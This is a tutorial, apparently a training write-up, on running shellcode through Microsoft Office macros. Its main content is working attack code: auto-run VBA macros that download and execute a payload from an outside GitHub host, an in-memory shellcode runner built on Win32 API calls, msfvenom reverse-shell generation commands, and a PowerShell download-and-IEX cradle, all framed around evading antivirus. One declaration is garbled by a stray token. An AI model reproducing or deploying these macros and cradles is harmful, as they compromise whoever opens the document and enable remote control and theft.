---
title: Shellcode execution using various methods
date: 01/04/2021
author: Soufiane Fariss
email: soufiane.fariss@um5s.net.ma
---

# Client Side Code Execution with Office
Gaining remote code execution can be done with a variety of methods. One of those methods is taking advantage of vulnerable software running on the endpoint. Though, it is hard to find vulnerabilities since patches are continuously being ruled out, and even if we find a vulnerability we have to develop a working exploit in order to successfully gain a foothold.  

So, to gain remote code execution without relying on software  vulnerabilities we will attempt abuse common features and functionalities provided by software running on the endpoint. Specifically, the goal of this module is to exploit the Microsoft Office suite to execute malicious code.

## The Client-Side Attack Scenario
To initiate a client-side attack, an attacker often delivers a _Trojan_ (for example, in the form of an innocent looking Word or PDF document). Traditional droppers embed an entire payload into the Trojan, but almost all malware families are tending to rely on complex _Droppers_ that use a _staged_ payload that connects back to a C2 to download the second stage.

Once the code has been delivered, it may be written directly to the hard disk or run directly from memory (This is what knows as **In-Memory Execution**).

### Staged vs Non-staged Payload
There are two types of payloads, they are as follows -
- **Non-staged payloads** is a self-contained of code instruction that serve to perform some actions. For example the Metasploit `windows/tcp_reverse_shell` is non-staged payload to open up a reverse command shell and expose to the attacker's machine. This type of payloads are really just fire-and-forget.

- On the other hand, **Staged payloads** allow for reusability using different stages. These payloads contain a minimal amount of code that perform a _callback_, then retrieves the remaining code. This is usually the preferred type for malware developers since it allows for reusability and helps to avoid detection since it is smaller compared to a non-staged payload.

To generate a non-staged payload in Metasploit, we use:
```
windows/x64/meterpreter_reverse_https
```
and to generate a staged payload, 
```
windows/x64/meterpreter/reverse_https
```

**Note**: "`_`" for non-staged, and "`/`" for staged payloads.
## Running Shellcode
### Running system commands from VBA
There is two ways to this. First, using the builtin `Shell` command

![](https://i.imgur.com/AWCWBVk.png)

Or by doing this: 
![](https://i.imgur.com/S2LA6o9.png)


### Running Shellcode with VBA
#### Introduction to calling Win32 APIs in VBA
Currently, our malicious macro downloads a malicious payload and saves to the hard disk. This, however, raises suspicious and most AVs will flag it. Our goal is to avoid writing to the hard disk. To do this, we will leverage Win32 API calls. These API calls reside with dynamically-linked libraries (DLLs). These are self-contained pieces of code that expose their functionalities (APIs) to other applications.

Let's try and use the `GetUserNameA` API inside VBA. To do this, we need to first get the function signature and C and _translate_ it to a VBA signature.

The `GetUserNameA` API resides within `Advapi32.dll` and its C signature is:
```c
BOOL GetUserNameA(
  LPSTR   lpBuffer,
  LPDWORD pcbBuffer
);
```
To get the translation, we'll use P/Invoke (`www.invoke.net`). A quick google yields the following VBA translation:
```vba
Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, ByRef nMax As Integer) As Boolean
```

The following is an example of using `GetUserNameA` to get the username and print it to the screen:
```vba
' Access the GetUserNameA function in advapi32.dll and
' call the function GetUserName.
Declare Function GetUserName Lib "advapi32.dll" Alias "GetUserNameA" (ByVal lpBuffer As String, nSize As Long) As Long
 
' Main routine to retrieve user name.
Function GetLogonName() As String

    ' Dimension variables
    Dim lpBuff As String * 255
    Dim ret As Long
    
    ' Get the user name minus any trailing spaces found in the name.
    ret = GetUserName(lpBuff, 255)
    
    If ret > 0 Then
        GetLogonName = Left(lpBuff, InStr(lpBuff, Chr(0)) - 1)
    Else
        GetLogonName = vbNullString
    End If
    
    MsgBox ("Curren logged in user: " + GetLogonName)
End Function
```

![Current Logged In user](https://i.imgur.com/1pU7nmH.png)

#### Running shellcode in VBA: The basic method
We can run a piece of code, by first saving it to disk then running. This is by far the most easy way to detect malware.
Even the simplest defense systems can catch this.


```vba
Sub Document_Open()
 MyMacro
End Sub

Sub AutoOpen()
 MyMacro
End Sub

Sub MyMacro()
 Dim str As String
 str = "powershell (New-Object System.Net.WebClient).DownloadFile('https://github.com/soufianefariss/malrepo/raw/master/shell.exe', 'shell.exe')"
 Shell str, vbHide
 Dim exePath As String
 ' Get full path of exe using path of current Word document
 exePath = ActiveDocument.Path + "\shell.exe"
 ' Wait 2 seconds to complete download (You can tweak this timeout)
 Wait (2)
 ' After Saving it, run it.
 Shell exePath, vbHide
End Sub
Sub Wait(n As Long)
 Dim t As Date
 t = Now
 Do
 DoEvents
 Loop Until Now >= DateAdd("s", n, t)
End Sub
```

As we said before, it is easily detected:

![](https://i.imgur.com/Av3d8uN.png)

#### Running shellcode in VBA with `CreateThread()`
After reviewing how to invoke Win32 APIs in VBA, we will use them to run our shellcode in Word memory without saving it to hard disk. This is quite helpful for evading detection. The most used APIs to do are `VirtualAlloc` to allocate RWX memory withing, `RtlMoveMemory` to copy the shellcode we previously generated with metasploit and finally running that shellcode with `CreateThread`. Please note that this are not the only ways to do this, there are many other APIs we can use. We will see this later.

Let's generate our tcp reverse shell payload. We will choose `-f vbapplication` to get a VBA-formatted output.
```bash
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.1.9 LPORT=5577 EXITFUNC=thread -f vbapplication
```
![VBA formatted output](https://i.imgur.com/PiJ8NWk.png)

So this how we are going to run the shellcode in VBA:
1. Create the `buf` variable containing the shellcode
2. Allocate virtual memory with `VirtualAlloc`
3. Copy our shellcode to the allocated memory.
4. Create a thread to run the shellcode with `CreateThread`

To generate the payload with metasploit, use the commands:
```
msf > use payload/windows/exec
msf  payload(exec) > set CMD calc
CMD => calc
msf  payload(exec) > set EXITFUNC thread
EXITFUNC => thread
msf  payload(exec) > generate -t vba
```

The output is:

![](https://i.imgur.com/PiJ8NWk.png)

Let's now create our vba script embedded with the shellcode:

```vba
#If Vba7 Then
	Private Declare PtrSafe Function CreateThread Lib "kernel32" (ByVal SecAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParamter As Long, ByVal CreateFlag As Long, ThreadId As Long) As LongPtr
	jje Declare PtrSafe Function VirtualAlloc Lib "kernel32" (ByVal lpAddress As Long, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr
	Private Declare PtrSafe Function RtlMoveMemory Lib "kernel32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr
#Else
	Private Declare Function CreateThread Lib "kernel32" (ByVal SecAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As Long, ThreadParamter As Long, ByVal CreateFlag As Long, ThreadId As Long) As Long
	Private Declare Function VirtualAlloc Lib "kernel32" (ByVal Vanw As Long, ByVal Rsqif As Long, ByVal Fimyna As Long, ByVal Zko As Long) As Long
	Private Declare Function RtlMoveMemory Lib "kernel32" (ByVal lDestination As Long, ByRef sSource As Any, ByVal lLength As Long) As Long
#EndIf

Sub Auto_Open()
	Dim data As Long, shellcode As Variant, counter As Long
#If Vba7 Then
	Dim  addr As LongPtr, res As LongPtr
#Else
	Dim  addr As Long, res As Long
#EndIf
	shellcode = Array(232,130,0,0,0,96,137,229,49,192,100,139,80,48,139,82,12,139,82,20,139,114,40,15,183,74,38,49,255,172,60,97,124,2,44,32,193,207,13,1,199,226,242,82,87,139,82,16,139,74,60,139,76,17,120,227,72,1,209,81,139,89,32,1,211,139,73,24,227,58,73,139,52,139,1,214,49,255,172,193, _
207,13,1,199,56,224,117,246,3,125,248,59,125,36,117,228,88,139,88,36,1,211,102,139,12,75,139,88,28,1,211,139,4,139,1,208,137,68,36,36,91,91,97,89,90,81,255,224,95,95,90,139,18,235,141,93,106,1,141,133,178,0,0,0,80,104,49,139,111,135,255,213,187,224,29,42,10,104,166,149, _
189,157,255,213,60,6,124,10,128,251,224,117,5,187,71,19,114,111,106,0,83,255,213,99,97,108,99,0)

	addr = VirtualAlloc(0, UBound(shellcode), &H1000, &H40)
  MsgBox('The address of the newly allocated memory is: ' + Hex(addr))
	For counter = LBound(shellcode) To UBound(shellcode)
		data = shellcode(counter)
		res = RtlMoveMemory(addr + counter, data, 1)
	Next counter
	res = CreateThread(0, 0, addr, 0, 0, 0)
End Sub
Sub AutoOpen()
	Auto_Open
End Sub
Sub Document_Open()
	Auto_Open
End Sub
```

Here's the memory region we just created, it contains the payload byte-per-byte.
![Memory region](https://i.imgur.com/cPgzXY3.png)

#### Running Shellcode with PowerShell
There are many drawback to our VBA exploit. First of all, it contains the hard-coded payload. Second, if the user closes the Word program we will lose the shell.

To impove upon the first issue, we will not hard-code the payload into the document, but we will use PowerShell cradles to download & execute the payload. And to solve the issue of the shell closing after Word has exited, we will opt to create a child process that will not die after WINWORD.exe has exited. 

Though they are many cradles, we will use `DownloadString` method from `WebClient` to download the PowerShell script, and directly running it in memory with the `Invoke-Expression` commandlet.

As we did with VBA, we need to translate the Win32 API calls to PowerShell since we cannot natively invoke them. Again, `www.pinvoke.com` contains all the tranlations we need.

##### Example: Get current user name
```powershell
$sig = @'
[DllImport("advapi32.dll", SetLastError = true)]
public static extern bool GetUserName(System.Text.StringBuilder sb, ref Int32 length);
'@

Add-Type -MemberDefinition $sig -Namespace Advapi32 -Name Util

$size = 64
$str = New-Object System.Text.StringBuilder -ArgumentList $size

[Advapi32.util]::GetUserName($str,[ref]$size) |Out-Null
$str.ToString()
```
![get user in powershell](https://i.imgur.com/1pU7nmH.png)
To explain what we just did, we declared a `$sig` variable and assigned a block of text to it. (The keyword '`@`' declares Here-Strings).
Within the block of text, we imported the `GetUserNameA` API from `advapi21.dll` and finally, we use _Add-Type_ to compile the C# block text inside `$sig`.

Now let's do the same for the two APIs `VirtualAlloc` and `CreateThread` (We won't need `RtlMoveMemory` since C# has a `Copy()` function): 

```powershell
$Kernel32 = @"

using System;
using System.Runtime.InteropServices;

public class Imports {
    [DllImport("kernel32")]
      public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32", CharSet=CharSet.Ansi)]
     public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

}
"@

Add-Type $Kernel32
```
![kernel32-import](https://i.imgur.com/tVGrP6A.png)

Let's now generate a powershell (`ps1`) payload that opens up a `cmd.exe`:
```
msf > use payload/windows/exec
msf  payload(exec) > set CMD cmd
CMD => calc
msf  payload(exec) > set EXITFUNC thread
EXITFUNC => thread
msf  payload(exec) > generate -t ps1
```

![payload generation for ps1](https://i.imgur.com/TuETmlu.png)

Great, now we figured how to run the payload with PowerShell. But if we use ProcessHacker, we notice that our shell gets terminated as soon as it is run. To fix we will use the `WaitForSingleObject`, but before that let's add its C# signature to the list.

Here's the final powershell script:
```powershell
$Kernel32 = @"

using System;
using System.Runtime.InteropServices;

public class Kernel32 {
    [DllImport("kernel32")]
      public static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

    [DllImport("kernel32", CharSet=CharSet.Ansi)]
      public static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

    [DllImport("kernel32.dll", SetLastError=true)]
      public static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

}
"@

Add-Type $Kernel32

$buf = 0xfc,0xe8,0x82,0x0,0x0,0x0,0x60,0x89,0xe5,0x31,0xc0,0x64,0x8b,0x50,0x30,0x8b,0x52,0xc,0x8b,0x52,0x14,0x8b,0x72,0x28,0xf,0xb7,0x4a,0x26,0x31,0xff,0xac,0x3c,0x61,0x7c,0x2,0x2c,0x20,0xc1,0xcf,0xd,0x1,0xc7,0xe2,0xf2,0x52,0x57,0x8b,0x52,0x10,0x8b,0x4a,0x3c,0x8b,0x4c,0x11,0x78,0xe3,0x48,0x1,0xd1,0x51,0x8b,0x59,0x20,0x1,0xd3,0x8b,0x49,0x18,0xe3,0x3a,0x49,0x8b,0x34,0x8b,0x1,0xd6,0x31,0xff,0xac,0xc1,0xcf,0xd,0x1,0xc7,0x38,0xe0,0x75,0xf6,0x3,0x7d,0xf8,0x3b,0x7d,0x24,0x75,0xe4,0x58,0x8b,0x58,0x24,0x1,0xd3,0x66,0x8b,0xc,0x4b,0x8b,0x58,0x1c,0x1,0xd3,0x8b,0x4,0x8b,0x1,0xd0,0x89,0x44,0x24,0x24,0x5b,0x5b,0x61,0x59,0x5a,0x51,0xff,0xe0,0x5f,0x5f,0x5a,0x8b,0x12,0xeb,0x8d,0x5d,0x6a,0x1,0x8d,0x85,0xb2,0x0,0x0,0x0,0x50,0x68,0x31,0x8b,0x6f,0x87,0xff,0xd5,0xbb,0xe0,0x1d,0x2a,0xa,0x68,0xa6,0x95,0xbd,0x9d,0xff,0xd5,0x3c,0x6,0x7c,0xa,0x80,0xfb,0xe0,0x75,0x5,0xbb,0x47,0x13,0x72,0x6f,0x6a,0x0,0x53,0xff,0xd5,0x63,0x61,0x6c,0x63,0x0  

$size = $buf.Length

[IntPtr]$addr = [Kernel32]::VirtualAlloc(0,$size,0x3000,0x40);  

[System.Runtime.InteropServices.Marshal]::Copy($buf, 0, $addr, $size) 

$thandle=[Kernel32]::CreateThread(0,0,$addr,0,0,0);

# We should add WaitForSingleObject, so that our shell won't get terminated before execution.

[Kernel32]::WaitForSingleObject($thandle, [uint32]"0xFFFFFFFF")
```


The only thing left now, is to host this script on a server and fetch it using a cradle inside of a VBA script.
```vba
Sub DownloadAndRunShellcode()
  Dim str As String
  str = "powershell (New-Object System.Net.WebClient).DownloadString('https://raw.githubusercontent.com/soufianefariss/malrepo/master/evil.ps1') | IEX"
  Shell str, vbHide
End Sub

Sub Document_Open()
  DownloadAndRunShellcode
End Sub

Sub AutoOpen()
  DownloadAndRunShellcode
End Sub
```


## Conclusion
In this article, I went over how to build our first shellcode runner in vba, first by saving it to disk then running it. Later on, we improved this with PowerShell, it helped to avoid saving to disk and directly running the shellcode in memory to avoid detection.

Sadly though, PowerShell still keeps traces in memory which can be picked by EDRs and AVs. Next week, we will see how to overcome this and GO FULL FILELESS!

~Soufiane.
